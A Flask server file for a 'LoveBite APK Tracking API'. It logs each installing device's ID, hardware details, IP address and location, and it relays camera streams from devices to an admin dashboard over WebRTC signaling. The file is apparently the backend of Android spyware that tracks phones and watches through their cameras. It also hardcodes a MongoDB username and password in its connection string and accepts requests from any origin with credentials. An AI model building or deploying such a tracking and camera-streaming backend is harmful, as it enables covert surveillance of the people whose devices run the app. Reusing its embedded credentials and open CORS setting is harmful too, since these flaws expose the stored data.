from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from datetime import datetime
import json
import os
import time
import uuid
from bson import ObjectId
import logging
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins="*", supports_credentials=True)

# Check if we're running on Vercel (serverless environment)
IS_VERCEL = os.getenv('VERCEL') == '1'

# Only import SocketIO if not on Vercel
if not IS_VERCEL:
    try:
        from flask_socketio import SocketIO, emit, join_room, leave_room
        # Configure SocketIO with better production settings
        socketio = SocketIO(
            app, 
            cors_allowed_origins="*",
            logger=True,
            engineio_logger=True,
            ping_timeout=60,
            ping_interval=25,
            max_http_buffer_size=1000000  # 1MB buffer for WebRTC data
        )
    except ImportError:
        socketio = None
        print("⚠️  Flask-SocketIO not available, WebSocket features disabled")
else:
    socketio = None
    print("🔧 Running on Vercel - WebSocket features disabled")

# MongoDB connection
MONGODB_URI = "mongodb+srv://hussnainrajpoot5415:123456...@blogsdb.9xfkjee.mongodb.net/?retryWrites=true&w=majority&appName=blogsdb"

# Global variables for MongoDB
client = None
db = None
installations_collection = None
mongodb_connected = False

# In-memory storage for testing when MongoDB is not available
in_memory_storage = []

# WebRTC signaling storage
webrtc_offers = {}
webrtc_answers = {}
active_camera_streams = {}
ice_candidates = {}

def init_mongodb_async():
    """Initialize MongoDB connection in background thread"""
    global client, db, installations_collection, mongodb_connected
    try:
        logger.info("🔄 Attempting MongoDB connection...")
        client = MongoClient(
            MONGODB_URI, 
            serverSelectionTimeoutMS=10000,
            connectTimeoutMS=10000,
            socketTimeoutMS=10000,
            maxPoolSize=5,
            retryWrites=True,
            retryReads=True
        )
        # Test the connection
        client.admin.command('ping')
        db = client['lovebite']
        installations_collection = db['apk_installations']
        mongodb_connected = True
        logger.info("✅ Connected to MongoDB successfully!")
        print("✅ Connected to MongoDB successfully!")
    except Exception as e:
        logger.error(f"❌ MongoDB connection failed: {e}")
        print(f"❌ MongoDB connection failed: {e}")
        print("🔄 Using in-memory storage for testing...")
        mongodb_connected = False

# Start MongoDB connection in background thread - DON'T BLOCK STARTUP
mongodb_thread = threading.Thread(target=init_mongodb_async, daemon=True)
mongodb_thread.start()

class JSONEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, ObjectId):
            return str(obj)
        return super().default(obj)

app.json_encoder = JSONEncoder

@app.route('/')
def home():
    """Quick home endpoint"""
    return jsonify({
        "message": "LoveBite APK Tracking API",
        "status": "healthy",
        "version": "1.0.0",
        "mongodb": "connected" if mongodb_connected else "connecting",
        "timestamp": datetime.utcnow().isoformat()
    })

@app.route('/health')
def health():
    """FAST health check endpoint for Railway - NO DATABASE CHECKS"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat()
    }), 200

@app.route('/api/status')
def detailed_status():
    """Detailed status including MongoDB connection"""
    return jsonify({
        "status": "healthy",
        "mongodb": "connected" if mongodb_connected else "connecting",
        "port": os.getenv('PORT', '8080'),
        "environment": os.getenv('RAILWAY_ENVIRONMENT', 'local'),
        "timestamp": datetime.utcnow().isoformat()
    })

@app.route('/api/track-installation', methods=['POST'])
def track_installation():
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ['device_id', 'app_version', 'device_info']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    "success": False,
                    "error": f"Missing required field: {field}"
                }), 400
        
        # Create installation record
        installation_record = {
            "device_id": data['device_id'],
            "app_version": data['app_version'],
            "device_info": data['device_info'],
            "installation_time": datetime.utcnow(),
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', ''),
            "country": data.get('country', 'Unknown'),
            "city": data.get('city', 'Unknown'),
            "timezone": data.get('timezone', 'Unknown'),
            "is_active": True,
            "last_seen": datetime.utcnow()
        }
        
        if mongodb_connected and installations_collection is not None:
            # Use MongoDB
            existing_device = installations_collection.find_one({"device_id": data['device_id']})
            
            if existing_device:
                installations_collection.update_one(
                    {"device_id": data['device_id']},
                    {
                        "$set": {
                            "last_seen": datetime.utcnow(),
                            "is_active": True,
                            "app_version": data['app_version'],
                            "device_info": data['device_info']
                        }
                    }
                )
                message = "Device information updated"
            else:
                installations_collection.insert_one(installation_record)
                message = "New installation tracked"
        else:
            # Use in-memory storage
            existing_device = next((d for d in in_memory_storage if d['device_id'] == data['device_id']), None)
            
            if existing_device:
                existing_device.update({
                    "last_seen": datetime.utcnow(),
                    "is_active": True,
                    "app_version": data['app_version'],
                    "device_info": data['device_info']
                })
                message = "Device information updated"
            else:
                in_memory_storage.append(installation_record)
                message = "New installation tracked"
        
        return jsonify({
            "success": True,
            "message": message,
            "device_id": data['device_id']
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/installations', methods=['GET'])
def get_installations():
    try:
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 50))
        country = request.args.get('country')
        active_only = request.args.get('active_only', 'true').lower() == 'true'
        
        query = {}
        if country:
            query['country'] = country
        if active_only:
            query['is_active'] = True
        
        if mongodb_connected and installations_collection is not None:
            total_count = installations_collection.count_documents(query)
            skip = (page - 1) * limit
            installations = list(installations_collection.find(query)
                               .sort('installation_time', -1)
                               .skip(skip)
                               .limit(limit))
        else:
            filtered_installations = []
            for installation in in_memory_storage:
                if country and installation.get('country') != country:
                    continue
                if active_only and not installation.get('is_active', True):
                    continue
                filtered_installations.append(installation)
            
            total_count = len(filtered_installations)
            installations = sorted(filtered_installations, 
                                 key=lambda x: x.get('installation_time', datetime.min), 
                                 reverse=True)
            skip = (page - 1) * limit
            installations = installations[skip:skip + limit]
        
        for installation in installations:
            if '_id' in installation:
                installation['_id'] = str(installation['_id'])
            if 'installation_time' in installation:
                installation['installation_time'] = installation['installation_time'].isoformat()
            if 'last_seen' in installation:
                installation['last_seen'] = installation['last_seen'].isoformat()
        
        return jsonify({
            "success": True,
            "data": installations,
            "pagination": {
                "page": page,
                "limit": limit,
                "total_count": total_count,
                "total_pages": (total_count + limit - 1) // limit
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# WebSocket Event Handlers (only available when SocketIO is enabled)
if socketio:
    @socketio.on('connect')
    def handle_connect():
        try:
            logger.info(f"Client connected: {request.sid}")
            emit('connected', {'message': 'Connected to LoveBite server'})
        except Exception as e:
            logger.error(f"Error in connect handler: {e}")

    @socketio.on('disconnect')
    def handle_disconnect():
        try:
            logger.info(f"Client disconnected: {request.sid}")
            for device_id, stream_info in list(active_camera_streams.items()):
                if stream_info.get('client_id') == request.sid:
                    del active_camera_streams[device_id]
                    emit('camera_stopped', {'device_id': device_id}, room='admin_dashboard')
        except Exception as e:
            logger.error(f"Error in disconnect handler: {e}")

    @socketio.on('join_admin_room')
    def handle_join_admin_room():
        join_room('admin_dashboard')
        print(f"Admin client connected: {request.sid}")
        emit('joined_admin_room', {'message': 'Joined admin dashboard'})

# Vercel handler
def handler(request):
    return app(request.environ, lambda *args: None)

if __name__ == '__main__':
    print("🚀 Starting LoveBite APK Tracking API...")
    print(f"🔌 MongoDB: {'Connecting in background...' if not mongodb_connected else 'Connected'}")
    
    if IS_VERCEL:
        print("🔧 Running on Vercel - WebSocket features disabled")
        # For Vercel, just run the Flask app without SocketIO
        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)
    elif socketio:
        print("🌐 WebSocket enabled for real-time camera streaming")
        socketio.run(
            app, 
            host='0.0.0.0', 
            port=int(os.getenv('PORT', '8080')),
            debug=False,
            allow_unsafe_werkzeug=True
        )
    else:
        print("⚠️  WebSocket features disabled - Flask-SocketIO not available")
        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)